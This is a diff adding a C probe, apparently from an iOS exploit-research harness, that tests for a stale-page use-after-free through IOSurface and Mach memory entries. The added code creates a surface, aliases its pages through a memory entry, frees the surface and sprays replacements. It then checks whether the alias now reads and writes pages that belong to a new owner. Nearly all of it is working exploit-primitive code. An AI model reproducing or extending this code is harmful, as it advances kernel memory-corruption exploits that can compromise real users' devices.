@@ -1264,3 +1264,243 @@ int mem_entry_probe(int *stages)
     vm_deallocate(mach_task_self(), addr, sz);
     return 0;
 }
+
+
+
+/* ------------------------------------------------------------------ */
+/* IOSurface stale-page race (ClearSword-style physical gate).         */
+/*                                                                     */
+/* `--iosurfphys` proved an unsigned app can wrap an IOSurface's       */
+/* backing pages in a memory entry and alias them at a chosen VA. It   */
+/* did not prove the pages can be *freed* while anything still names    */
+/* them: a user mapping pins the object, so the interesting variant    */
+/* must drop every user mapping before the surface dies and keep only  */
+/* the memory object.                                                  */
+/*                                                                     */
+/* Phase 0 is a control: without any memory entry, does the IOSurface  */
+/* allocator hand the released base address back out during a spray?   */
+/* If it does not, the race below cannot be observed at all.           */
+/*                                                                     */
+/* Phases:                                                             */
+/*   0 control  - create/release/spray, look for base reuse            */
+/*   1 create a PurpleGfxMem surface, write a marker through its base  */
+/*   2 make a memory entry over that base                              */
+/*   3 map the entry once to confirm aliasing, then DEALLOCATE it      */
+/*   4 CFRelease the surface, spray fresh surfaces, re-map the entry   */
+/*      and read: marker intact => the entry retains the object;       */
+/*      content matching a sprayed surface => it names freed pages     */
+/*      that have been reallocated.                                    */
+/*                                                                     */
+/* All log lines go to both log_from_c and stdout so the devicectl     */
+/* console capture sees every stage.                                   */
+
+#include <CoreFoundation/CoreFoundation.h>
+#include <dlfcn.h>
+
+typedef struct __IOSurface *iosr_ref_t;
+typedef iosr_ref_t (*iosr_create_fn)(CFDictionaryRef);
+typedef uint32_t (*iosr_getid_fn)(iosr_ref_t);
+typedef void *(*iosr_getbase_fn)(iosr_ref_t);
+typedef size_t (*iosr_getalloc_fn)(iosr_ref_t);
+
+typedef kern_return_t (*iosr_mach_vm_map_fn)(vm_map_t, mach_vm_address_t *,
+                                             mach_vm_size_t, mach_vm_offset_t,
+                                             int, mach_port_t,
+                                             memory_object_offset_t,
+                                             boolean_t, vm_prot_t, vm_prot_t,
+                                             vm_inherit_t);
+
+#define IOSR_ALLOC 0x8000
+#define IOSR_SPRAY 64
+
+static iosr_create_fn  g_iosr_create;
+static iosr_getid_fn   g_iosr_getid;
+static iosr_getbase_fn g_iosr_getbase;
+static iosr_getalloc_fn g_iosr_getalloc;
+static iosr_mach_vm_map_fn g_iosr_vm_map;
+static iosr_ref_t g_iosr_keep[IOSR_SPRAY];
+
+static iosr_ref_t iosr_make(int use_region)
+{
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
+        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    if (!props) return NULL;
+
+    int w = 64, h = 2, bpe = 4, row = 256, pix = 1111970369 /* 'BGRA' */;
+    long alloc = IOSR_ALLOC;
+    CFNumberRef n;
+    n = CFNumberCreate(NULL, kCFNumberIntType, &w);    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), n);         CFRelease(n);
+    n = CFNumberCreate(NULL, kCFNumberIntType, &h);    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), n);        CFRelease(n);
+    n = CFNumberCreate(NULL, kCFNumberIntType, &bpe);  CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), n); CFRelease(n);
+    n = CFNumberCreate(NULL, kCFNumberIntType, &row);  CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), n);   CFRelease(n);
+    n = CFNumberCreate(NULL, kCFNumberIntType, &pix);  CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), n);   CFRelease(n);
+    n = CFNumberCreate(NULL, kCFNumberLongType, &alloc);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), n); CFRelease(n);
+    if (use_region)
+        CFDictionarySetValue(props, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));
+
+    iosr_ref_t s = g_iosr_create(props);
+    CFRelease(props);
+    return s;
+}
+
+static int iosr_spray(int use_region, int count)
+{
+    int kept = 0;
+    for (int i = 0; i < count; i++) {
+        iosr_ref_t s = iosr_make(use_region);
+        if (!s) break;
+        g_iosr_keep[kept++] = s;
+    }
+    return kept;
+}
+
+static void iosr_release_all(void)
+{
+    for (int i = 0; i < IOSR_SPRAY; i++) {
+        if (g_iosr_keep[i]) CFRelease(g_iosr_keep[i]);
+        g_iosr_keep[i] = NULL;
+    }
+}
+
+static int iosr_find_base(uint64_t want)
+{
+    for (int i = 0; i < IOSR_SPRAY; i++) {
+        if (!g_iosr_keep[i]) continue;
+        if ((uint64_t)(uintptr_t)g_iosr_getbase(g_iosr_keep[i]) == want) return i;
+    }
+    return -1;
+}
+
+int iosurf_race_probe(int *stages)
+{
+    if (!stages) return -1;
+    for (int i = 0; i < 8; i++) stages[i] = 0;
+
+    void *fh = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    if (!fh) fh = dlopen("IOSurface", RTLD_NOW);
+    if (!fh) { mep_log("[-] iosurfrace: dlopen IOSurface failed: %s", dlerror()); return 0; }
+
+    g_iosr_create  = (iosr_create_fn)dlsym(fh, "IOSurfaceCreate");
+    g_iosr_getid   = (iosr_getid_fn)dlsym(fh, "IOSurfaceGetID");
+    g_iosr_getbase = (iosr_getbase_fn)dlsym(fh, "IOSurfaceGetBaseAddress");
+    g_iosr_getalloc = (iosr_getalloc_fn)dlsym(fh, "IOSurfaceGetAllocSize");
+    void *lh = dlopen("/usr/lib/libSystem.B.dylib", RTLD_NOW);
+    g_iosr_vm_map = (iosr_mach_vm_map_fn)dlsym(lh ? lh : RTLD_DEFAULT, "mach_vm_map");
+
+    mep_log("[*] iosurfrace syms create=%p id=%p base=%p alloc=%p mach_vm_map=%p",
+            (void *)g_iosr_create, (void *)g_iosr_getid, (void *)g_iosr_getbase,
+            (void *)g_iosr_getalloc, (void *)g_iosr_vm_map);
+    if (!g_iosr_create || !g_iosr_getid || !g_iosr_getbase || !g_iosr_getalloc || !g_iosr_vm_map) {
+        mep_log("[-] iosurfrace: a required symbol is missing");
+        return 0;
+    }
+
+    /* ---- phase 0: control - does the allocator recycle a released base? ---- */
+    iosr_ref_t ctl = iosr_make(1);
+    if (!ctl) { mep_log("[-] iosurfrace: control surface create failed"); return 0; }
+    uint64_t ctl_base = (uint64_t)(uintptr_t)g_iosr_getbase(ctl);
+    mep_log("[*] iosurfrace phase0 control base=0x%llx alloc=0x%zx",
+            (unsigned long long)ctl_base, g_iosr_getalloc(ctl));
+    CFRelease(ctl);
+    int kept0 = iosr_spray(1, IOSR_SPRAY);
+    int reused0 = iosr_find_base(ctl_base);
+    mep_log("[*] iosurfrace phase0 after release + spray(%d): base_reused=%s idx=%d",
+            kept0, reused0 >= 0 ? "YES" : "no", reused0);
+    stages[0] = (reused0 >= 0) ? 1 : 0;
+    iosr_release_all();
+
+    /* ---- phase 1: surface + marker ---- */
+    iosr_ref_t s = iosr_make(1);
+    if (!s) { mep_log("[-] iosurfrace: surface create failed"); return 0; }
+    uint64_t base = (uint64_t)(uintptr_t)g_iosr_getbase(s);
+    size_t alloc = g_iosr_getalloc(s);
+    uint32_t marker = 0xAAAA0001u;
+    *(volatile uint32_t *)(uintptr_t)base = marker;
+    uint32_t rb = *(volatile uint32_t *)(uintptr_t)base;
+    mep_log("[*] iosurfrace surface id=0x%x base=0x%llx alloc=0x%zx marker=0x%08x rb=0x%08x",
+            g_iosr_getid(s), (unsigned long long)base, alloc, marker, rb);
+    stages[1] = (rb == marker) ? 1 : 0;
+
+    /* ---- phase 2: memory entry over the surface base ---- */
+    mach_vm_size_t esz = (mach_vm_size_t)alloc;
+    mach_port_t obj = MACH_PORT_NULL;
+    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &esz,
+                                                 (mach_vm_offset_t)base,
+                                                 VM_PROT_READ | VM_PROT_WRITE,
+                                                 &obj, MACH_PORT_NULL);
+    mep_log("[*] iosurfrace entry(size=0x%llx) -> kr=%d (0x%x) handle=0x%x",
+            (unsigned long long)esz, (int)kr, (unsigned)kr, (unsigned)obj);
+    stages[2] = (int)kr;
+    if (kr != KERN_SUCCESS || obj == MACH_PORT_NULL) {
+        CFRelease(s);
+        return 0;
+    }
+
+    /* ---- phase 3: confirm aliasing, then drop the user mapping ---- */
+    mach_vm_address_t a1 = 0;
+    kr = g_iosr_vm_map(mach_task_self(), &a1, esz, 0, VM_FLAGS_ANYWHERE, obj, 0, FALSE,
+                       VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+                       VM_INHERIT_NONE);
+    uint32_t m1 = 0;
+    if (kr == KERN_SUCCESS && a1) m1 = *(volatile uint32_t *)(uintptr_t)a1;
+    mep_log("[*] iosurfrace alias1 -> kr=%d (0x%x) at 0x%llx marker=0x%08x same=%s",
+            (int)kr, (unsigned)kr, (unsigned long long)a1, m1,
+            (m1 == marker) ? "YES" : "no");
+    stages[3] = (m1 == marker) ? 1 : 0;
+    if (a1) vm_deallocate(mach_task_self(), (vm_address_t)a1, (vm_size_t)esz);
+    mep_log("[*] iosurfrace alias1 deallocated; no user mapping of the object remains");
+
+    /* ---- phase 4: destroy the surface, spray, re-map the entry ---- */
+    CFRelease(s);
+    mep_log("[*] iosurfrace surface CFReleased; only the memory entry remains");
+
+    int kept = iosr_spray(1, IOSR_SPRAY);
+    int idx = iosr_find_base(base);
+    mep_log("[*] iosurfrace spray(%d): old base reclaimed=%s idx=%d",
+            kept, idx >= 0 ? "YES" : "no", idx);
+    stages[4] = (idx >= 0) ? 1 : 0;
+
+    mach_vm_address_t a2 = 0;
+    kr = g_iosr_vm_map(mach_task_self(), &a2, esz, 0, VM_FLAGS_ANYWHERE, obj, 0, FALSE,
+                       VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+                       VM_INHERIT_NONE);
+    uint32_t m2 = 0xffffffffu;
+    if (kr == KERN_SUCCESS && a2) m2 = *(volatile uint32_t *)(uintptr_t)a2;
+    uint32_t spray_word = 0xdeadbeefu;
+    if (idx >= 0)
+        spray_word = *(volatile uint32_t *)(uintptr_t)g_iosr_getbase(g_iosr_keep[idx]);
+
+    mep_log("[*] iosurfrace alias2(after release) -> kr=%d (0x%x) at 0x%llx read=0x%08x",
+            (int)kr, (unsigned)kr, (unsigned long long)a2, m2);
+    mep_log("[*] iosurfrace spray_base_content=0x%08x", spray_word);
+
+    /* Discriminator: the first read cannot tell "the entry pinned its own copy"
+       from "the entry names pages that have been reallocated". Write a fresh
+       value through the reclaimed surface's own mapping and read the entry
+       again - if the alias follows, it is naming the *current* owner's pages. */
+    uint32_t follow = 0;
+    int other = (idx >= 0 && idx != 0) ? 0 : 1;
+    if (idx >= 0 && a2) {
+        *(volatile uint32_t *)(uintptr_t)g_iosr_getbase(g_iosr_keep[idx]) = 0x77770002u;
+        follow = *(volatile uint32_t *)(uintptr_t)a2;
+        if (other < IOSR_SPRAY && g_iosr_keep[other])
+            *(volatile uint32_t *)(uintptr_t)g_iosr_getbase(g_iosr_keep[other]) = 0x66660003u;
+        uint32_t follow2 = *(volatile uint32_t *)(uintptr_t)a2;
+        mep_log("[*] iosurfrace discriminator: wrote 0x77770002 into reclaimed surface, "
+                "alias now reads 0x%08x (after control write: 0x%08x)",
+                follow, follow2);
+        mep_log("[*] iosurfrace VERDICT alias_follows_new_owner=%s marker_intact=%s",
+                (follow == 0x77770002u) ? "YES" : "no",
+                (follow == marker) ? "YES" : "no");
+        stages[5] = (follow == 0x77770002u) ? 2 : ((follow == marker) ? 1 : 0);
+    } else {
+        mep_log("[*] iosurfrace VERDICT marker_intact=%s", (m2 == marker) ? "YES" : "no");
+        stages[5] = (m2 == marker) ? 1 : 0;
+    }
+
+    if (a2) vm_deallocate(mach_task_self(), (vm_address_t)a2, (vm_size_t)esz);
+    mach_port_deallocate(mach_task_self(), obj);
+    iosr_release_all();
+    return 0;
+}
